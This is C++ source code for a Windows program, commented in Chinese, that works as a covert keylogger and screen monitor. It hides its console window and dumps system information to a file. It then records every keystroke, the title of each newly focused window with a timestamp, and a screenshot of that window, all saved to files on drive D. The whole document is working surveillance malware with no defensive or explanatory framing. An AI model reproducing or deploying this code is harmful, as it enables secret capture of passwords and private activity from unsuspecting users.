// ConsoleApplication7.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"


using namespace std;
string Filename = "D:\\program\\cdobe\\bin\\log.txt";//倒出记录文本存在D盘log.txt目录下

void PrtScn(char   *file_string,HWND hwnd) {

	//获取该窗口的大小
	RECT rect;
	GetClientRect(hwnd, &rect);
	int width = rect.right;
	int heigth = rect.bottom;
	// 获取窗口的设备上下文（Device Contexts）
	HDC hdcWindow = GetDC(hwnd); // 要截图的窗口句柄，为空则全屏
	

								 // 获取设备相关信息的尺寸大小
	int nBitPerPixel = GetDeviceCaps(hdcWindow, BITSPIXEL);
	CImage image;
	// 创建图像，设置宽高，像素
	image.Create(width, heigth, nBitPerPixel);
	// 对指定的源设备环境区域中的像素进行位块（bit_block）转换
	BitBlt(
		image.GetDC(),  // 保存到的目标 图片对象 上下文
		0, 0,     // 起始 x, y 坐标
		width, heigth,  // 截图宽高
		hdcWindow,      // 截取对象的 上下文句柄
		0, 0,           // 指定源矩形区域左上角的 X, y 逻辑坐标
		SRCCOPY);


	image.Save(file_string);

	// 释放 DC句柄
	ReleaseDC(hwnd, hdcWindow);
	// 释放图片上下文
	image.ReleaseDC();
	// 将图片保存到 file_string
	//image.ReleaseGDIPlus();
	image.Destroy();
}


void Write(string ch)
{
	ofstream f1;
	f1.open(Filename, ios::app);
	f1 << ch;
	f1.close();
}
void Hide()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_HIDE);
}
void GiveChar(char a[256], char b[256])
{
	for (int i = 0; i <= 256; i++)
		a[i] = b[i];
}
bool CheckChar(char a[256], char b[256])
{
	for (int i = 0; i <= 256; i++)
	{
		if (a[i] != b[i])
		{
			return 0;
		}
	}
	return 1;
}
void GetSystemTime()
{
	SYSTEMTIME sys;
	GetLocalTime(&sys);
	cout << sys.wYear << "/" << sys.wMonth << "/" << sys.wDay << " " << sys.wHour << ":" << sys.wMinute << ": " << sys.wMinute << " ";
}
string GetKey(int Key) // 判断键盘按下什么键
{
	string KeyString = "";
	//判断符号输入
	const int KeyPressMask = 0x80000000; //键盘掩码常量
	int iShift = GetKeyState(0x10); //判断Shift键状态
	bool IS = (iShift & KeyPressMask) == KeyPressMask; //表示按下Shift键
	if (Key >= 186 && Key <= 222)
	{
		switch (Key)
		{
		case 186:
			if (IS)
				KeyString = ":";
			else
				KeyString = ";";
			break;
		case 187:
			if (IS)
				KeyString = "+";
			else
				KeyString = "=";
			break;
		case 188:
			if (IS)
				KeyString = "<";
			else
				KeyString = ",";
			break;
		case 189:
			if (IS)
				KeyString = "_";
			else
				KeyString = "-";
			break;
		case 190:
			if (IS)
				KeyString = ">";
			else
				KeyString = ".";
			break;
		case 191:
			if (IS)
				KeyString = "?";
			else
				KeyString = "/";
			break;
		case 192:
			if (IS)
				KeyString = "~";
			else
				KeyString = "`";
			break;
		case 219:
			if (IS)
				KeyString = "{";
			else
				KeyString = "[";
			break;
		case 220:
			if (IS)
				KeyString = "|";
			else
				KeyString = "\\";
			break;
		case 221:
			if (IS)
				KeyString = "}";
			else
				KeyString = "]";
			break;
		case 222:
			if (IS)
				KeyString = '"';
			else
				KeyString = "'";
			break;
		}
	}
	//判断键盘的第一行
	if (Key == VK_ESCAPE) // 退出
		KeyString = "[Esc]";
	else if (Key == VK_F1) // F1至F12
		KeyString = "[F1]";
	else if (Key == VK_F2)
		KeyString = "[F2]";
	else if (Key == VK_F3)
		KeyString = "[F3]";
	else if (Key == VK_F4)
		KeyString = "[F4]";
	else if (Key == VK_F5)
		KeyString = "[F5]";
	else if (Key == VK_F6)
		KeyString = "[F6]";
	else if (Key == VK_F7)
		KeyString = "[F7]";
	else if (Key == VK_F8)
		KeyString = "[F8]";
	else if (Key == VK_F9)
		KeyString = "[F9]";
	else if (Key == VK_F10)
		KeyString = "[F10]";
	else if (Key == VK_F11)
		KeyString = "[F11]";
	else if (Key == VK_F12)
		KeyString = "[F12]";
	else if (Key == VK_SNAPSHOT) // 打印屏幕
		KeyString = "[PrScrn]";
	else if (Key == VK_SCROLL) // 滚动锁定
		KeyString = "[Scroll Lock]";
	else if (Key == VK_PAUSE) // 暂停、中断
		KeyString = "[Pause]";
	else if (Key == VK_CAPITAL) // 大写锁定
		KeyString = "[Caps Lock]";

	//-------------------------------------//
	//控制键
	else if (Key == 8) //<- 回格键
		KeyString = "[Backspace]";
	else if (Key == VK_RETURN) // 回车键、换行
		KeyString = "[Enter]\n";
	else if (Key == VK_SPACE) // 空格
		KeyString = " ";
	//上档键:键盘记录的时候，可以不记录。单独的Shift是不会有任何字符，
	//上档键和别的键组合，输出时有字符输出
	/*
	else if (Key == VK_LSHIFT) // 左侧上档键
	KeyString = "[Shift]";
	else if (Key == VK_LSHIFT) // 右侧上档键
	KeyString = "[SHIFT]";
	*/
	/*如果只是对键盘输入的字母进行记录:可以不让以下键输出到文件*/
	else if (Key == VK_TAB) // 制表键
		KeyString = "[Tab]";
	else if (Key == VK_LCONTROL) // 左控制键
		KeyString = "[Ctrl]";
	else if (Key == VK_RCONTROL) // 右控制键
		KeyString = "[CTRL]";
	else if (Key == VK_LMENU) // 左换档键
		KeyString = "[Alt]";
	else if (Key == VK_LMENU) // 右换档键
		KeyString = "[ALT]";
	else if (Key == VK_LWIN) // 右 WINDOWS 键
		KeyString = "[Win]";
	else if (Key == VK_RWIN) // 右 WINDOWS 键
		KeyString = "[WIN]";
	else if (Key == VK_APPS) // 键盘上 右键
		KeyString = "右键";
	else if (Key == VK_INSERT) // 插入
		KeyString = "[Insert]";
	else if (Key == VK_DELETE) // 删除
		KeyString = "[Delete]";
	else if (Key == VK_HOME) // 起始
		KeyString = "[Home]";
	else if (Key == VK_END) // 结束
		KeyString = "[End]";
	else if (Key == VK_PRIOR) // 上一页
		KeyString = "[PgUp]";
	else if (Key == VK_NEXT) // 下一页
		KeyString = "[PgDown]";
	// 不常用的几个键:一般键盘没有
	else if (Key == VK_CANCEL) // Cancel
		KeyString = "[Cancel]";
	else if (Key == VK_CLEAR) // Clear
		KeyString = "[Clear]";
	else if (Key == VK_SELECT) //Select
		KeyString = "[Select]";
	else if (Key == VK_PRINT) //Print
		KeyString = "[Print]";
	else if (Key == VK_EXECUTE) //Execute
		KeyString = "[Execute]";

	//----------------------------------------//
	else if (Key == VK_LEFT) //上、下、左、右键
		KeyString = "[←]";
	else if (Key == VK_RIGHT)
		KeyString = "[→]";
	else if (Key == VK_UP)
		KeyString = "[↑]";
	else if (Key == VK_DOWN)
		KeyString = "[↓]";
	else if (Key == VK_NUMLOCK)//小键盘数码锁定
		KeyString = "[NumLock]";
	else if (Key == VK_ADD) // 加、减、乘、除
		KeyString = "+";
	else if (Key == VK_SUBTRACT)
		KeyString = "-";
	else if (Key == VK_MULTIPLY)
		KeyString = "*";
	else if (Key == VK_DIVIDE)
		KeyString = "/";
	else if (Key == 190 || Key == 110) // 小键盘 . 及键盘 .
		KeyString = ".";
	//小键盘数字键:0-9
	else if (Key == VK_NUMPAD0)
		KeyString = "0";
	else if (Key == VK_NUMPAD1)
		KeyString = "1";
	else if (Key == VK_NUMPAD2)
		KeyString = "2";
	else if (Key == VK_NUMPAD3)
		KeyString = "3";
	else if (Key == VK_NUMPAD4)
		KeyString = "4";
	else if (Key == VK_NUMPAD5)
		KeyString = "5";
	else if (Key == VK_NUMPAD6)
		KeyString = "6";
	else if (Key == VK_NUMPAD7)
		KeyString = "7";
	else if (Key == VK_NUMPAD8)
		KeyString = "8";
	else if (Key == VK_NUMPAD9)
		KeyString = "9";
	//-------------------------------------------//

	//-------------------------------------------//
	//*对字母的大小写进行判断*//
	else if (Key >= 97 && Key <= 122) // 字母:a-z
	{
		if (GetKeyState(VK_CAPITAL)) // 大写锁定
		{
			if (IS) //Shift按下:为小写字母
				KeyString = Key;
			else // 只有大写锁定:输出大写字母
				KeyString = Key - 32;
		}
		else// 大写没有锁定
		{
			if (IS) // 按下Shift键: 大写字母
				KeyString = Key - 32;
			else // 没有按Shift键: 小写字母
				KeyString = Key;
		}
	}
	else if (Key >= 48 && Key <= 57) // 键盘数字:0-9及上方的符号
	{
		if (IS)
		{
			switch (Key)
			{
			case 48: //0
				KeyString = ")";
				break;
			case 49://1
				KeyString = "!";
				break;
			case 50://2
				KeyString = "@";
				break;
			case 51://3
				KeyString = "#";
				break;
			case 52://4
				KeyString = "$";
				break;
			case 53://5
				KeyString = "%";
				break;
			case 54://6
				KeyString = "^";
				break;
			case 55://7
				KeyString = "&";
				break;
			case 56://8
				KeyString = "*";
				break;
			case 57://9
				KeyString = "(";
				break;
			}
		}
		else
			KeyString = Key;
	}
	if (Key != VK_LBUTTON || Key != VK_RBUTTON)
	{
		if (Key >= 65 && Key <= 90) //ASCII 65-90 为A-Z
		{
			if (GetKeyState(VK_CAPITAL)) // 大写锁定:输出A-Z
			{
				if (IS) // 大写锁定，并且按下上档键:输出为小写字母
					KeyString = Key + 32;
				else //只有大写锁定:输出为大写字母
					KeyString = Key;
			}
			else // 大写没有锁定:a-z
			{
				if (IS)
				{
					KeyString = Key;
				}
				else
				{
					Key = Key + 32;
					KeyString = Key;
				}
			}
		}
	}

	return KeyString;
}

//连接时间字符串
CString getfilename(WORD year, WORD month, WORD day, WORD hour,WORD minute,WORD second) {
	CString year1, month1, day1, hour1, minute1, second1;
	year1.Format("%d",year);
	month1.Format("%d", month);
	day1.Format("%d", day);
	hour1.Format("%d", hour);
	minute1.Format("%d", minute);
	second1.Format("%d", second);
	CString path1 = year1 +"."+ month1 + "." + day1 + "_" + hour1 + "." + minute1 + "." + second1;
	return path1;
}

wchar_t* c2w(const char *str)
{
	int length = strlen(str) + 1;
	wchar_t *t = (wchar_t*)malloc(sizeof(wchar_t)*length);
	memset(t, 0, length*sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, str, strlen(str), t, length);
	return t;
}

void main()
{
	Hide();// 隐藏窗口
//	char pathname[50];
	WORD year,month,day,hour,minute,second;
	char wnd_title[256];
	HWND hwnd ;
	HWND hwnd_new = GetForegroundWindow();
	SYSTEMTIME sys;//时间对象

	CString PrtScnPath;
	CString PrtScnName;
	CString file_string;

	system("systeminfo  >> D:\\systeminfo.txt");

	while (1)
	{
		ofstream f1;
		f1.open(Filename, ios::app);
		hwnd = hwnd_new;
		hwnd_new = GetForegroundWindow(); // get handle of currently active window
		GetWindowText(hwnd_new, wnd_title, sizeof(wnd_title));//最新窗口给 0

		if (hwnd != hwnd_new&&hwnd_new!=NULL)
		{
			
			
			GetLocalTime(&sys);
			year = sys.wYear; month = sys.wMonth; day = sys.wDay; hour = sys.wHour; minute = sys.wMinute; second = sys.wSecond;
			//下面三行可以注释掉，节约资源
			cout << endl;
			cout << year << "/" << month << "/" << day << " " << hour << ":" << minute << ":" << second << " ";
			cout << wnd_title << " ";

			f1 << "\n ";
			f1 << year << "/" << month << "/" << day << " " << hour << ":" << minute << ":" << second << " ";
			f1 << wnd_title << " ";

			PrtScnPath = "D:\\";
			PrtScnName = getfilename(year, month, day, hour, minute, second);
			file_string = PrtScnPath + PrtScnName + ".jpg";
			//char  *file_string = _T("D:\\");//保存路径
			cout << file_string;
			PrtScn((LPSTR)(LPCTSTR)file_string,hwnd_new);

		}
		string TempString = "";
		fstream FStream;
		FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);



		Sleep(5);
		for (int i = 8; i <= 255; i++)
		{
			if (GetAsyncKeyState(i) & 1 == 1)
			{
				TempString = GetKey(i);
				FStream.write(TempString.c_str(), TempString.size());
				cout << TempString;
				FStream.close();
				FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);
			}
		}

	}
}